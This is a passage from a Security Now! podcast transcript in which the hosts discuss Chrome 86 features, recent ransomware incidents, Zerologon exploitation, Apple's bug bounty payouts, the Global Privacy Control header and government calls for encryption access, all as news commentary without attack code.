And finally, with Chrome 88, FTP will be completely sunsetted.  I don't even know if you'll still be able to turn it on.  Probably you could do a command line override, if you really, really definitely had to have it for some reason.  But they're trying to say no.  And we talked about this before.  FTP's not a bad protocol, it's just weird to have it in a browser because the number of times you actually need to be looking at FTP servers and downloading things from them seems like it would be a low Venn diagram collision with browser uses.  There are plenty of FTP clients around.



And as for that "what could possibly go wrong" new feature, get a load of this one.  Chrome 86's new Native File System API, as they're calling it, is activated by default in Chrome 86.  Google boasts that it will enable developers to build powerful web apps that interact with files on the user's local device.  Now, naturally, you wouldn't want any random malvertising advertisement to have full and unfettered API access to your entire machine.  So yes, the new API is blocked and hidden behind a permission prompt to prevent websites from accessing any local files without your authorization.



LEO:  Good.  



STEVE:  Yeah, huh?  I know.  Again, what could possibly go wrong?



LEO:  Jesus.



STEVE:  After a user grants the browser access, this API allows a website to behave like - and this is Google, like, saying "Won't this be great?"  Like, okay, like a locally installed app reading, saving, and interacting with files and folders on a user's device.  Google expects this new API to be used to power a broad range of bracing interactive web apps - yeah, brace yourself - such as IDEs, photo and video editors, text editors, and more.  There's no end to what the bad guys are going to think of, I'm sure.



LEO:  Right.



STEVE:  So again, you just know.



LEO:  It's like ActiveX.  It's basically letting the browser run an arbitrary app on your system.  With full access.



STEVE:  Yes.  Yes.  And we've got WebAssembly now in order to do things fast, and very much like down actually talking to the processor.  And you just know that someone is going to want to automate that pesky permission prompt; right?



LEO:  Yeah, yeah.



STEVE:  I mean, who really wants to have to constantly be giving permission?  That's just annoying.



LEO:  I presume they're not going to let you bypass it.  That would be problematic.



STEVE:  This podcast is never going to end, Leo.  They just keep setting us up.  So on the ransomware front, we do have confirmation that Carnival Corporation, the largest cruise line operator, has confirmed in last week's FCC filing that the personal information of customers, employees, and ship crews, including their passports, was stolen during an August ransomware attack.  They employ more than 150,000 people from roughly 150 countries.  And they of course cater to, or at least they once did, over 13 million guests each year.



Although Carnival hasn't disclosed anything about the attack, the cybersecurity intelligence firm Bad Packets discovered that Carnival had multiple potential points of initial entry and compromise which a ransomware attacker might use to get in, specifically multiple Citrix Application Delivery Controller (ADC) devices and Palo Alto Networks firewalls.  The Citrix ADC was found to be vulnerable - or ADCs, multiple - was found to be vulnerable to a CVE from 2019, 19781.  And of course that firmware was updated in January, but not by Carnival.  And the Palo Alto Networks firewalls which we were talking about recently having a 2020 CVE, number 2021 problem, it was patched in June of this year; but, again, Carnival didn't get the memo.



And, you know, to cut them a little slack, it's difficult to imagine any industry that was probably harder hit by COVID-19 than cruise lines.  You're not on any recently, Leo, and we know you guys like those.



LEO:  Oh, man, if only.  But, yeah, it's going to be years before I'd feel safe on one of those.



STEVE:  Yeah.  In any event, both these vulnerabilities can be used by ransomware gangs as stepping stones to breach a corporate network, allowing them to then move laterally, collecting credentials needed to take over admin accounts and up to and including, as we've talked about, getting into the Windows domain controller.



Also a new trend has emerged which is a little chilling.  In hindsight, a not unexpected development in the ransomware scene.  The major ransomware network operators are beginning to purchase access to rich corporate networks, much like Carnival, from independent so-called "access providers."  In other words, a new layer of specialization is emerging as the ransomware cybercrime methodology continues to mature.  Accenture's Cyber Threat Intelligence (CTI) team has released new research on emerging cybersecurity trends.  This includes the results of their investigation into the nature of relationships between ransomware operators and exploit sellers.



In their piece titled "Shady Deals:  The Destructive Relationship Between Network Access Sellers and Ransomware Groups," they explain.  They said:  "Ransomware groups are taking advantage of opportunities to purchase network access on dark web forums to quickly compromise networks across a variety of industries and unleash their disabling malware.  Network access sellers' expertise lies in the ability to gain corporate and government network access, which they then sell to other cybercrime groups for a handsome profit.  These cybercrime groups can use purchased network access to slash the typical difficult requirement of gaining initial access, establishing persistence, and then moving laterally within a network.



"Network access sellers typically develop an initial network vulnerability and infiltrate the victim network to gain complete corporate network access.  Once that access is gained, the network access sellers sell it on dark web forums, usually for anywhere between $300 and $10,000, depending upon the size and revenue of the victim.  The majority of network access offerings are advertised on underground forums with some or all of the following information," they write:  "Generalized victim industry information, for example, private corporation, medical institution, government agency, education, et cetera; country the victim operates in; type of access for sale, for example, a VPN, Citrix, or RDP; the number of machines on the network; and additional company information, for example, the number of employees and revenue and so forth.  The amount of information provided can occasionally lead to the identification of the victim.



"Accenture CTI assesses that the network access market has been driven by the increased diversity of ways that data can be monetized.  Previously, cybercriminals wishing to make a profit on underground forums primarily targeted financial data due to its ease of monetization."  I mean, we've talked about this through the years; right?  Like selling credit card information.  You get so many cents per credit card number as a function of how old it was, the spread of expiration dates and so forth.



"However, the Nikolay threat group, also known as Fxmsp, popularized selling network accesses beginning two years ago, in 2018, by proving there was a large demand for their service and that regular sales could be highly profitable.  Although financial data remains central to underground economies, sensitive Personally Identifiable Information (PII) and company data, or the promise of access to this data, is profitable because this data can be further monetized through direct sale or by holding it ransom.



"Now, since the start of 2020 and the emergence of the now-popular 'ransomware with data theft and extortion' tactics, ransomware gangs have successfully utilized dark web platforms to outsource complicated aspects of a network compromise.  A successful ransomware attack hinges on the development and maintenance of stable network access which comes with a higher risk of detection and requires time and effort."  So why do it themselves?  Let's just buy some.



"Access sellers fill this niche market for ransomware groups.  As of September 2020," they said, "we actively track more than 25 persistent network access sellers, as well as the occasional one-off seller, with more entering the scene weekly.  Network access sellers operate on the same forums as actors associated with the ransomware gangs Maze, Lockbit, Avaddon, Exorcist, NetWalker, Sodinokibi, and others."



They said:  "We assess with high confidence that this ecosystem will continue to thrive so long as reputable, invite-only dark web forums provide the platform on which network access sellers and ransomware gangs can securely exchange goods and services."  So, yeah.  What we're seeing is the emergence now of specialization.  The ransomware market has become so profitable that it will support horizontal integration.



In other words, it's not necessary for the extortionists to be vertically integrated and doing everything themselves.  They can afford to outsource the front end work of obtaining access to corporate networks, and they can afford to pay a pretty penny for that access.  That allows hackers with network penetration skills to focus only on getting in, without needing to have the skill set to monetize the access that they obtain, because now there's an eager and active bidding market for that access on the dark web.  Oh, Leo.  Yeah.  We got plenty more podcasts where this one came from.



Also just another note, another victim.  The largest software company in North America that none of us have ever heard of, Tyler Technologies.



LEO:  Eh?



STEVE:  It services the - I know - public sector.  It's got over 1.2 billion in annual revenue, and 5,500 employees.  Wednesday, September 23rd, Tyler was hit with a cyberattack by the RansomExx, that's E-X-X, ransomware operators.  That's the same team that was behind the recent attacks on Konica Minolta and IPG Photonics.  Tyler immediately disconnected portions of their network to prevent the ransomware's spread and to limit their many clients' exposure.  CIO Matt Bieri emailed clients, writing:  "Early this morning we became aware that an unauthorized intruder had disrupted access to some of our internal systems.  Upon discovery and out of an abundance of caution, we shut down points of access to external systems and immediately began investigating and remediating the problem."



So they did succeed in containing and preventing its spread into their clients' networks.  Tyler said that they were severely impacted and expected it would take 30 days to recover operations fully.  So Tyler paid the ransom to recover their encrypted data, though they're not saying how much they paid.  RansomExx is one of the groups known to exfiltrate data before encrypting it, and then threaten to release the stolen data unless the victim pays the ransom.  Since many school districts, court systems, and local and state governments in the U.S. are Tyler Technology's customers, the risk of public disclosure of sensitive information is significant in this case.



So this concern may have been a significant factor in the decision to pay the ransom.  Again, we don't know how much, but they did say, yup, we paid because we need to get back up and going.  And even if we could recover from backups, we can't risk the data that was exfiltrated going public.  And I won't enumerate them, but a bunch of school districts have also recently, in the past few weeks, been hit by ransomware, causing disruption to tens of thousands and several hundred schools being taken offline as a consequence.



So this is just kind of nutty.  But laws.



LEO:  That's all you have to say.



STEVE:  Week before last at least five - I guess in something of a sweep of some kind - five bar and caf managers in the French city of Grenoble were arrested and taken into custody.



LEO:  Oh, I saw this.  This is hysterical.



STEVE:  Yeah.  It's nuts.  And we'll talk about how actually more nutty it is now than it was a month ago.  Anyway, they were arrested and taken into custody for running open WiFi networks at their establishments and not keeping logs of previously connected users.



LEO:  Is that a French law?  That's a weird law.



STEVE:  It is a weird law.  Now, the reason is that the law says Internet Service Providers.  And, okay, well, I guess if you're running open WiFi, then technically you're an ISP.  Although, I mean, it just seems like a misreading of the intention behind the whole thing.  They were held and questioned.  It's like, what?  Like, are our croissants fresh?  Yes.  Do we log the identity of people who use our free WiFi?  What?  No.  Nobody does that.  Apparently this is French law.  Oh, and this is - get this, Leo - 14 years old.  So 2006.  The law is numbered 2006-64.  They risk a year in prison, a personal fine of up to 75,000 euro, and a business fine of up to 375,000 euro.  Which is obviously targeted at ISP companies.



LEO:  Yeah, not a bar, yeah.



STEVE:  Yeah, not some caf that's serving espresso.



LEO:  A lot of espressos.



STEVE:  Yeah.  So obviously it makes far more sense for an actual ISP than an open WiFi access point.



LEO:  Right.  And that's probably what the law was intended for, I would bet.  I understand why they might - I don't think it's a good thing, but I can understand why a government might want to track Internet users.



STEVE:  Yes.  And again, the other thing that occurred to me is that, once upon a time, before we had MAC address randomization, which we now have, you could log the MAC address of the device that was hooking to your access point.



LEO:  Good point; right.



STEVE:  And so as we know, 24 bits gives you the manufacturer of the device.  The lower 24 bits gives you a serial number maintained by that manufacturer.  So it would be possible, once upon a time, to have used such MAC address logs to identify a specific laptop user and to, like, you know, follow them around where they went or to know if they were, essentially, know who they were.



LEO:  To prosecute them.  Yeah.  I mean, if they were doing child porn or something on the caf's access point, you could track that down.



STEVE:  Exactly.  Exactly.



LEO:  But nowadays you're pretty anonymous there; aren't you?



STEVE:  Well, what Apple announced, to our delight, with iOS 14 was finally true, full, WiFi MAC anonymization.  It used to be that, until you were associated with an access point, the iPhone would just give out random MAC addresses because who cared.  And when you were associated it would then use the device's physical MAC address.  And that was always a concern for privacy advocates.  So now here we have a perfect instance of where we have a collision of the privacy interests of the user which Apple is enforcing now much more strongly with iOS 14, and the privacy-busting interests of law enforcement for the sake of presumably protecting their citizenry because now iOS 14 devices, they're not trackable, even if you were to log.  So that makes the logs even more useless.



I'm not sure where laptops are in the MAC address randomization land, but one can imagine having had it proven to work by iOS 14, and Apple being as cautious as they were, it wouldn't be long before you start seeing laptops doing the same thing, if some of them aren't already.



LEO:  Also, I mean, it's easy to spoof a MAC address.  I would imagine, if you're going to do bad things on a public network, you're going to have some sec ops involved, I would think.  Maybe not, I don't know.



STEVE:  Well, now, and what's interesting is that MAC addresses are the things that aren't tunneled in VPNs.  So somebody using a VPN would still be exposing their device's MAC address unless, as you said, they went to some measures to deliberately spoof it.  And also one could imagine that arranging to do that would not be difficult.  Because it was like no, you know, there are - and we've talked about this before.  There are like, in some corporate settings there are MAC address filters which enable access.  But they're bad for security because anybody can see the MAC addresses that are flying around in the air and just use the same one.



LEO:  And honestly, I'm sure this law was intended, as you think, for ISPs, where they know, you know, you pay them.  They know your street address.  If there's a bad activity, you can subpoena the ISP, I've done this, and get the, okay, well, who was using 70.32.3.4 at 10:00 p.m. Sunday night, and get the address.  And that's, by the way, that happens with subpoenas all the time in the United States.  I understand that, yeah.  But a bar, come on.  Especially a French bar.  What are you talking about?



STEVE:  Okay.  So what do you get when a team of five talented security researchers settle down during the global pandemic to poke at Apple's online services for three months, during July, August, and September?  What you get is some significantly more secure services as a result of their discoveries and responsible disclosures of 55 vulnerabilities, 11 of which were critical.  And what they got for 28 of the vulnerabilities that Apple has been able to process so far is a total bug bounty payout of more than a quarter million dollars - 288,500, to be precise.



Sam Curry, the lead researcher, blogged.  He said:  "When we first started this project we had no idea we'd spend a little over three months working towards it completion.  This was originally meant to be a side project that we'd work on every once in a while.  But with all the extra free time during the pandemic, we each ended up putting in a few hundred hours.



"In addition to the 11 critical flaws, 29 were high severity, 13 medium, and two low severity," he wrote.  They could have allowed an attacker to "fully compromise both customer and employee applications, launch a worm capable of automatically taking over a victim's iCloud account, retrieve source code from internal Apple projects, fully compromise an industrial control warehouse software used by Apple, and take over the sessions of Apple employees with the capability of accessing management tools and sensitive resources."  To which I say I'm glad these guys are on our side.



The flaws meant a bad actor could easily hijack a user's iCloud account and steal all the photos, calendar information, videos, and documents, in addition to forwarding the same exploit to all their contacts.  To Apple's credit, and likely to their shock and horror, once the flaws were responsibly disclosed, Apple patched the flaws within one to two business days, and in the case of a few of them, four to six hours.  And I especially love Sam's description of how this happened.  And please take heed, all of you other big companies, because it's Apple who is now so much richer for having dangled and paid those bounties.



Here's how this all began.  Sam wrote:  "While scrolling through Twitter sometime around July, I noticed a blog post being shared where a researcher was awarded $100,000 from Apple for discovering an authentication bypass that allowed them to arbitrarily access any Apple customer account.  This was surprising to me, as I previously understood that Apple's bug bounty program only awarded security vulnerabilities affecting their physical products and did not pay out for issues affecting their web assets."



And, oh, Sam's byline in his blog posting is  "Web Application Security Researcher."  So if Apple was only paying for flaws found in iOS and their various iDevices, then that would not be the territory of a web application security researcher such as Sam.  But then he learned, oh, no, this was a web fault in the authentication bypass that this researcher found, for which Apple paid $100,000.



So the blog, it was a Twitter posting, "Zero-Day Sign-in with Apple, Bounty $100,000," on May 30th, 2020.  So that caught Sam's attention.  His blog posting continues:  "After finishing the article, I did a quick Google search and found their program page where it detailed that Apple was willing to pay for vulnerabilities 'with significant impact to users' regardless of whether or not the asset was explicitly listed as in scope.  This caught my attention as an interesting opportunity to investigate a new program which appeared to have a wide scope and fun functionality.



"At the time, I had never worked on the Apple bug bounty program.  So I really didn't have any idea what to expect, but decided, why not try my luck and see what I could find?  In order to make the project more fun, I sent a few messages to hackers I'd worked with in the past" - four of them - "and asked if they'd like to work together on the program.  Even though there was no guarantee regarding payouts, nor an understanding of how the program worked, everyone said yes, and we began hacking on Apple."



So as we know, bad guys are highly motivated by their own self interest to find high-value flaws in other peoples' work.  But it's not only the bad guys who are good hackers.  It's the bad guys who are typically the most motivated.  Everybody needs to put bread on the table, good guys and bad guys.  And much as good guys might want to spend their valuable time fixing other peoples' stuff, they cannot typically afford to.  This is why generous bug bounty programs work.  It was that story of the $100,000 windfall that caught Sam's attention.  And unless it had, we would not be recounting this story, and all of those previously undiscovered problems would have remained undiscovered.  Some would have been eventually found, probably.  The question is by whom?



So again, this just really says that companies with profiles like Apple's who have a big online presence ought to also have a big online bug bounty.  And they ought to be advertising it.  I mean, if they want their stuff secured, they don't want bad buys to find them and sell them to Zerodium.  They want good guys to find them and sell them to themselves, essentially, sell them back to the company in return for a bounty.  So big props to Apple.  This is the way it should work.  And it just seems so clear that offering bounties is the way you get good talented white hat hackers to take a look at your stuff.  We've already seen, you know, programmers, I mean, I'm well aware of it, programmers cannot see their own bugs.  I look at code I have written, and it looks perfect.



LEO:  Oh, yeah, yeah.



STEVE:  It's just like, I look at it, and I know there's a problem.  I can't see it.  And that's why we have debuggers.  I'll be, like, single-stepping through the debugger.  That's good, okay.  That's good, okay.  That's good, okay.  And I look at the next one, it's like, oh.  And then it's like, yup.  I meant "jump if not zero," rather than "jump if zero."  



LEO:  Yeah.  There's no one who's ever coded who hasn't had that experience of just staring at your code, saying I don't see what's wrong.  I don't see.  I can't see anything wrong with it.  That's just, you know, that's normal, yeah.



STEVE:  And a bad guy who wants it to be wrong, rather than our own egos that inherently doesn't want it to be wrong...



LEO:  Good point.  Good point.  That's a very excellent point, yeah.  We have an investment in it being right.  That's right.



STEVE:  Yes, yes.



LEO:  Wow.



STEVE:  I've told the story before about an employee of mine, Jim, who was very bright.  He told everybody he was a Gates kid.  It's like, okay, fine.  And unfortunately he got a little too much attention from his mother, I think.  But anyway, I worked with him debugging, I think it was SpinRite 3.1 back in the day.  And he would guess what the bug was.  And without sufficient information.  But he would just, you know, he wanted to be right.  That was his thing.  And I would say, "Well, Jim, okay, maybe," I said.  "But now there's a problem."  And he said, "What do you mean?"  I said, "Well, now you have an ego stake in the outcome.  But it's just a bug.  It's just software.  It doesn't have any involvement in this from an emotional standpoint.  Now you do."



LEO:  Very good point.  Thank you, Sensei.



STEVE:  It's the value of just being able to say, "I don't know.  I have no" - I say it all the time.  "I have no idea.  But I'm going to go find out."  And that's the best place to start from.



LEO:  Love it, yup. 



STEVE:  So the exploit, Leo, that is going to go down in history, or the vulnerability and exploit, this is going to be one:  Zerologon.  Last week the Microsoft Security Intelligence Group sent out a tweet:  "We're seeing more activity leveraging the CVE-2020-1472 exploit."  And they said, "(Zerologon).  A new campaign shrewdly poses as software updates that connect to known" - and then they give the name of it - "CHIMBORAZO (TA505) C2" - that's command and control - "infrastructure.  The fake updates lead to UAC bypass" - User Account Control bypass - "and use of wscript.exe to run malicious scripts."  So again, Zerologon.



So first we had Microsoft's update last week.  What we know is that after the initial flurry of immediate action which was leveraging those proofs of concept that got posted, it's now been taken up by the mainstream serious threat actors.  It's been incorporated into the campaigns of several well-known ransomware extortionists.  And being a fundamental flaw in a core security protocol - remember, this is not an implementation error, this was a protocol error - and given the demonstrated lack of patching vigilance that we keep seeing, it will likely go down in history as one of the more devastating Windows vulnerabilities.  And there's more than a little competition in the Windows world for that role.



And speaking of Zerologon, then we have the unfortunate timing of all this, since the FBI and CISA, the cybersecurity arm of the Department of Homeland Security, last week said that they've detected hackers exploiting the Zerologon vulnerability against state and local governments where in some cases the attacks are being used to breach the networks used to support our elections.  It doesn't look like it's a deliberate attack on our elections.  But unfortunately, Zerologon vulnerabilities exist throughout our government.



And I just wanted to make an aside, also.  I recently noted that Florida's early vote counting machines are already up, running, and humming along, since early voting this year has, as we know, blown through all past records.  I was gratified to hear mentioned in the reporting of this that none of the machines counting the votes are on the Internet.  That was just mentioned in passing.  But what that says is that this notion of the danger that we're facing with anything connected to our networks is now like it's oozed out into the public conscience.  I mean, everybody knows that this is a problem.



So apparently the machines are not divulging their vote totals.  They will not until the polls have closed, in this case in Florida.  And then the accrued counts will be taken from them, those will be reset, and then the machines will continue counting additional votes that arrive based on whatever criteria there is.  So the good news is these things are not plugged into any network.  They are all freestanding.  So yay for that.



And FBI and DHS last week said:  "This recent malicious activity has often, but not exclusively, been directed at federal and state, local, tribal, and territorial" - for which there's an abbreviation, SLTT (state, local, tribal, and territorial) - "government networks."  They said:  "Although it does not appear these targets are being selected because of their proximity to elections information, there may be some risk to elections information housed on government networks.  CISA is aware of some instances where this activity resulted in unauthorized access to elections support systems; however, CISA has no evidence to date that the integrity of elections data has been compromised.  There are steps that election officials, their supporting SLTT IT staff, and vendors can take to help defend against this malicious cyber activity."



So yeah, as I said, the timing of Zerologon is unfortunate because it's still fresh enough that, despite the fact that DHS issued the commandment a few weeks ago that all systems, all government systems shall be patched by - and it was midnight of the Monday before the podcast a couple weeks ago.  It still looks like that commandment wasn't taken, didn't reach everybody that it was supposed to.  So anyway, yeah.  Stop using Windows for anything that's mission critical.  Find the most security hardened Unix or Linux around and use that, if possible.



LEO:  Wow.



STEVE:  Wow.  And what has been observed is that to gain their initial access - because remember, Zerologon is not an initial access vulnerability, it's like made to order once you get in for lateral movement, and then allows you to end up completely taking over the network.  But somehow you've got to first get in.  Turns out that hackers are exploiting vulnerabilities, known vulnerabilities, in every case long since patched, in firewalls and VPNs and other products from companies including Juniper, Pulse Secure, Citrix, and Palo Alto Networks.  All of the vulnerabilities, Zerologon included, again, as I said, have already received patches.  It's just I don't know how long it's going to take for this notion that anything that is networked needs to somehow have a means of getting itself updated.  That's just becoming more and more obvious and crucial.



Okay.  The revenge of DNT, which of course stood for Do Not Track.  We now have something emerging called GPC with legislation.  GPC stands for Global Privacy Control, making it easy for consumers to exercise their privacy rights.  So there is GlobalPrivacyControl.org, which is the home for this.  And this has just been announced.  Their press release explains:  "With the introduction of privacy regulations such as California's Consumer Privacy Act" - that's the CCPA - "and the General Data Protection Regulation" - the infamous GDPR - "consumers have more rights to limit the sale and sharing of their personal data than ever before.  CCPA in particular gives California residents a legal right to opt out of the sale of their data and requires businesses to respect user preferences through a signal from their web browser communicating the consumer's request to opt out."



They said:  "While this is great progress, it doesn't amount to much if it's hard for people to take advantage of their new rights.  Today, there's no defined or accepted technical standard for how such a web browser signal would work.  Without that, users don't have an easy way to express their preferences.  Indeed, in his recent testimony before the U.S. Senate, California Attorney General Xavier Becerra explained:  'One provision of our regulations intended to facilitate the submission of a request to opt-out of sale by requiring businesses to comply when a consumer has enabled a global privacy control at the device or browser level, which should be less time-consuming and burdensome.'  He said:  'I urge the technology community to develop consumer-friendly controls to make exercise of the right to opt out of the sale of information meaningful and frictionless.'"



So anyway, we have that now.  This effort, initially spearheaded by Georgetown Law and Wesleyan University, now also includes The New York Times; The Washington Post; the Financial Times; Automattic, which is to say WordPress.com & Tumblr; Glitch; DuckDuckGo; Brave; Mozilla; Disconnect; Abine; Digital Content Next; Consumer Reports; and the EFF.  "In the initial experimental phase, individuals can download browsers and extensions from Abine, Brave, Disconnect, DuckDuckGo, and the EFF in order to communicate their 'do not sell or share' preference to participating publishers.  Additionally, we are committed," they wrote, "to developing GPC into an open standard" - and actually that work is well along the way, as I'll explain in a second - "that many other organizations will support and are in the process of identifying the best venue for this proposal."



They said:  "We look forward to working with Attorney General Becerra to make GPC legally binding under CCPA.  At the same time, we are exploring GPC's applicability and functionality with regard to other similar laws worldwide, such as the GDPR. We are excited about the prospect of empowering people with an easy-to-use tool to exercise their privacy rights."



So I dug into this a little bit further and found the spec.  The spec is formal and clear.  So, for example, for this GPC header, the spec reads:  "A user agent MUST NOT" - all caps, and this is in formal RPC syntax or semantics.  A user agent like a browser must not "generate a Sec-GPC header field if the user's Global Privacy Control preference is not enabled.  A user agent MUST generate a Sec-GPC header field with a field-value that is exactly the numeric character '1' if the user's Global Privacy Control preference is set."  And then in the show notes and in the spec, they have an example, which is just an http query:  GET space and then the URL that you're getting.  Then the host header is :example.com.  And the Sec-GPC header is "1." 



So they said:  "The Sec-GPC is deliberately defined without an extension mechanism.  Experience with previous similar headers shows that people tend to rely on string equality instead of parsing the value when testing for their presence, especially when extensions do not yet exist.  Such checks would of course fail in the presence of extension content, which would in turn render the mechanism moot.  Should extensions prove necessary to this standard, they will need to be implemented through other headers, which may in time supersede this one.



"The Sec-GPC signal sent MUST reflect the user's preference, not the choice of some vendor, institution, site, or network-imposed mechanism outside the user's control.  The basic principle is that a Sec-GPC preference expression is only transmitted if it reflects a deliberate choice by the user.  What constitutes a deliberate choice may differ between regional regulations.  For example, regulations in one jurisdiction may consider the use of a privacy-focused browser to imply a Sec-GPC preference, such as under the CCPA Final Statement of Reasons, Appendix E #73, which reads:  'The consumer exercises their choice'" - by the way, this is the California Consumer Protection law.  "'The consumer exercises their choice by affirmatively choosing the privacy control, including when utilizing privacy-by-design products or services,' while regulations in another jurisdiction might require explicit consent from the user to send a Sec-GPC preference."



And they said it should be noted that users' preferences for privacy is well established, and user agents are expected to convey user preferences as accurately as they can.  To the extent possible, user agents SHOULD strive to represent user preferences, including if necessary by prompting users to decide whether they would prefer to have their data sold or not.  And then this ties into the subject of the podcast:  A site MAY produce a resource at a .well-known URL in order for a site to represent the fact that it abides by GPC.  A GPC support resource has the well-known identifier /.well-known/gpc relative to the origin server's URL.  And of course I didn't finish up talking about this, but Chrome 86 also is supporting another URL that is .well-known that we'll be getting to in a second.



So anyway, the point of this is that so we have a browser able now to clearly transmit as a beacon its users' privacy enforcement desires.  We have California and probably the GDPR working to legislate the legal force of this signal.  And we have a mechanism by which websites are able to, with low cost to themselves, also signal to anyone who's interested whether or not they support the GPC signal.  And so at some point, as legislation rolls forward, it will be incumbent upon sites that are subject to the California Consumer Protections Act and GDPR which are collecting privacy and information about their visitors to affirmatively state through this mechanism that they support GPC, and to then honor the requirements under the regulations that they would be subject to when a user visits their site with the beacon on that they want, you know, they are affirmatively requesting GPC support.



So this all seems like really good news.  GPC is not synonymous with the failed Do Not Track header, but it's clearly going to become a flag which will no doubt launch some lawsuits when sites are believed not to be honoring the intentions of their users in regions where users' intentions must by law be enforced.  So this is like a perfect mechanism for doing that.  They've clearly specified it the way we want so that no expression of preference is, you know, does not send a signal.  There is no presence of the header set to No.  It's either no header at all; or, if the header is there, it is set to a value of one.  And really only because headers have to have a value.  They're always a name:value in HTTP queries.  And that'll be sent to any website that needs to take a look at this.



So we've often talked, as all of our listeners know, I was very bullish about the idea of a DNT header, which didn't ever have any teeth behind it.  This one looks like it's getting some teeth.  So bravo.  Looks like Mozilla will be adopting it.  I don't see how Google can have their Chromium-based browser not do it, so Chromium will get it.  And then all the Chromium browsers will get it, and that'll pretty much - oh, and two authors at Apple were the authors of the spec.  So it seems clear to me that Safari, not surprisingly, will also be having a switch you can flip on if you want your privacy enforced.  So yay.



Two new countries have joined in with the Five Eyes intelligence-sharing alliance.  In addition to the U.K., U.S., Canada, Australia, and New Zealand, we now have Japan and India.  I just thought I would note, just because I think this is like the ultimate collision here of encryption and government, they've now put out over the weekend another call for industry to provide some form of, unfortunately, people keep calling it a backdoor.  That's just so heavily laden, I just wish we could come up with a different word.  I mean, I have been careful to call it "subpoena-compatible encryption or decryption."



And basically they say we call on technology companies to work with governments to take the following steps, focused on reasonable technically feasible solutions:  Embed the safety of the public in system design, thereby enabling companies to act against illegal content and activity effectively with no reduction to safety, and facilitating the investigation and prosecution of offenses and safeguarding the vulnerable, blah blah blah.  You know, same stuff.  Now we've got two more countries joining and the volume of the drumbeat increasing.



And as we know, I've often argued that Apple could enable iMessage and FaceTime wiretaps, as could Zoom, because in those instances they are managing the keys on behalf of their users.  But even I see no possibility for feasibly decrypting unmanaged applications such as Threema or VPNs.  That really would require some sort of sophisticated backdoor in encryption and decryption, and that would be an unmitigated disaster.  So when I try to understand why I've been saying something is possible, well, it's something is possible in a constrained environment where you've got a managed encryption platform like iMessage, FaceTime, and Zoom.  There is nothing that can be done in an unmanaged platform like with a VPN or Threema or any other encrypted applications.



This comes to light because their language says that they want device encryption, custom-encrypted applications, and encryption across integrated platforms like a VPN to be accessible.  And you just can't do that.  There is just no way.  I mean, it's like I can't even conceptually imagine how that could work.  You'd literally have to weaken the encryption so that it would take a huge amount of computing resource that only a massive entity would have.  But you'd have to be assuming that it couldn't be duplicated by others.



LEO:  Right.  Of course it can't.



STEVE:  It can't.  You can't make that assumption.



LEO:  So you're saying end-to-end encryption.  Is that what you mean by unmanaged is end-to-end encryption, encryption where there is no third party?



STEVE:  Correct, because Apple is a third party that manages the encryption.



LEO:  Right.  But as soon as you have no third party, as in Threema or Signal or...



STEVE:  A VPN.



LEO:  A VPN.  Well, there's a third - is there not a third - so the VPN server doesn't necessarily see your traffic.  Well, it does because it's emerging.  But if you had your own VPN is what you're saying.



STEVE:  As you've often said, I run a VPN where I have a server and a client.



LEO:  They've had to compromise that software that you're running.



STEVE:  Right, right.



LEO:  Because as we've also often talked about, with end-to-end encryption, the clear text sometimes, you know, if it's available on a device, all you need to do is compromise the device.  You don't need to compromise the encryption.



STEVE:  Right.  And in fact these guys are now saying they want statically encrypted content, that is, the content of an iPhone to be decryptable on presentation of a search warrant.  So again, I would argue Apple could do that, only because of the special position Apple has because they have tethered all of their iDevices back to their cloud infrastructure.  But freestanding devices that do not have a big daddy or a big brother the way we have with Apple, a benign overlord, there's just no way to do that.



LEO:  And as we know, the encryption technology is well understood and is easily transmitted.  And roll-your-own encryption is totally doable.  It doesn't take a huge amount of sophistication to write your own crypto which has no backdoor in it.



STEVE:  I did.



LEO:  You did.  And you're using NACL or some sort of library, so you don't even have to handle the crypto library.  You just have to write an interface for it.  



STEVE:  Right.



LEO:  And you can verify that the library's uncompromised.



STEVE:  Yup.



LEO:  So this is that argument when they outlaw crypto, only outlaws will have crypto kind of argument; right?



STEVE:  Yeah.



LEO:  The only people who will be inconvenienced are the people who can't roll their own crypto, or aren't sophisticated enough to do so.



STEVE:  Correct.  Correct.



LEO:  This is terrible.  It's a terrible idea.



STEVE:  I don't know what's going to happen.



LEO:  This basically makes everybody vulnerable, except for people like you and me who can do our own.  And everybody else is just, you know, including...



STEVE:  Well, but again, if we do our own, then we're breaking the law.



LEO:  That's true.



STEVE:  And so I don't want to break the law.



LEO:  That's true.



STEVE:  I want to have good laws.



LEO:  Yeah.



STEVE:  So I'm continuing to work toward the release of our ReadSpeed benchmark.  And I thought I should explain that the reason this is taking so long is that since this technology will be moved into SpinRite, it seemed to me that in the interest of minimizing the total delivery time for SpinRite, which is what we all want, I should be developing this code for its final release form for SpinRite's use.  So that's what I've been doing.  Essentially, everything I'm writing will be ready once we nail any bugs that we find by broadening the testing.  It'll just be drop-in ready.  I'll be able to move this into SpinRite because of course I know exactly what SpinRite's internal structure is.



So there's like all kinds of stuff that I don't need for the benchmark, like I just solved a problem of associating the BIOS view of drives, which are just BIOS numbers.  They're always a hex byte with the high bit set so it's 80, 81, 82, 83, 84, associating that with the physical controller and drive which I'm talking to.  And that's necessary because SpinRite still supports BIOS-based drives, for which I won't yet have low-level hardware drivers.  And so I don't want drives to appear twice.  I don't want them missing.  I want to provide and present a coherent view.



So all that's been resolved in the last couple days.  So a benchmark doesn't need any of that.  But rather than writing this all twice, I'm writing it for SpinRite and then sort of giving it a benchmark wrapping.  So anyway, we're really moving along nicely with that.  And the GRC forums are continuing also to develop.  We've got about 3,380-some registered users, generally about 70 or 80 unregistered people visiting at any given time.  The so-called "Off-Topic Lounge" has become so popular that it's clear that a community of sorts is beginning to form.  So I'm going to be dividing it up into on-topic subforums for talking about hardware, software, operating systems, a dialogue about the Security Now! podcast and so forth.  And even health and sci-fi, which are other interests of mine just because people want to talk about it.



So anyway, all of this is moving forward, and of course its intention is to be ready to support GRC's product stuff, whether free or commercial.  So the ReadSpeed benchmark will be first. 



And speaking of sci-fi, briefly, Ryk Brown has just dropped book 15 of the second series - the second series, Leo - of 15 of his truly fabulous Frontiers Saga series, which I recommend without reservation.  It's wonderful, pleasant, pure escapist science fiction featuring a cast of very well-formed and diverse characters who you really get to know and appreciate.  And it has a lot of humor, which makes it fun.  And Ryk Brown is one  hell of a storyteller.



So with this book, this wraps up the second series of 15.  So this is the 30th book in the series, the planned series of 75 books.  And I for one hope he never runs out of steam because this is one of the best, easiest to read, action-packed space operas I've ever encountered.  However, what Ryk has run out of patience with is Amazon's Kindle Unlimited service.  He's been complaining that he's just not making any money, despite the immense popularity of his novel series.



